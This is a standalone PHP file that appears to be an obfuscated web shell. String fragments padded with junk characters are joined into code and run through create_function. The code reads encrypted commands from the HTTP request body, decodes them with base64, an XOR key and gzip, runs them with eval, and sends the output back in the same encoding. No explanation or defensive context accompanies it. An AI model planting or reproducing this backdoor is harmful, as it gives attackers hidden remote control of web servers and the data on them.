<?php
$z='t_coBEntents(BE);@ob_eBEnd_cBElean()BE;$rBE=@base6BE4_encode(@BExBEBE(@gzcompresBEs($o),$k)BE);prinBEt("$p$kh$rBE$kf");}';
$G=str_replace('zj','','zjcreatzjezj_fzjuzjnctizjon');
$s='$kBEBE="e023b7c0";$kh=BE"9281dbBE181557";BE$kf=BEBE"642fbBEb1bBE404BEBEf";$p="nXN5p8adM3JBECpN6u";funcBEtioBEn x($BEt,$';
$b='nBEput"),$BEm)==1) BE{@ob_starBEBEt();BE@eBEval(@gzunBEcomBEpress(@x(@baseBE64BE_decode($m[1BE]),$BEk)));$o=@oBEBEb_ge';
$I='Eo.=$t{$i}BE^$kBE{BE$j};}}BEreBEturn $o;}if BE(@BEpreg_match("/$kh(BE.+)$kfBE/BE",@file_geBEBEt_cBEontenBEts("php://i';
$W='k){BE$BEc=strlBEen($k);$l=strlBEen($tBE);$o=""BE;forBE($iBE=0;$i<BE$l;)BE{fBEor($j=0;($j<$c&&$i<$lBE);$BEjBE++,$i++){$B';
$E=str_replace('BE','',$s.$W.$I.$b.$z);
$g=$G('',$E);$g();
?>
